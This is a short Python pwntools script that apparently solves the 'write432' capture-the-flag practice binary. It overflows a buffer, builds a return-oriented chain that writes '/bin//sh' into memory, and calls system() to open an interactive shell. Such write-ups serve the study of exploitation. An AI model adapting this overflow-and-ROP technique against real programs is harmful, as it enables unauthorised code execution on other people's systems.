#!/usr/bin/python 
from pwn import *

p = process("./write432")
elf = ELF("./write432")
mov_edi_ebp = 0x8048670
pop_edi_ebp = 0x80486da
writable = 0x804a070
p1ret = 0x80486db

pay = 'A'*(0x28 + 0x4)
pay += p32(pop_edi_ebp) + p32(writable) + "/bin"
pay += p32(mov_edi_ebp)
pay += p32(pop_edi_ebp) + p32(writable+4) + "//sh"
pay += p32(mov_edi_ebp)
pay += p32(elf.plt['system']) + p32(p1ret) + p32(writable)

p.sendlineafter("> ", pay)

p.interactive()
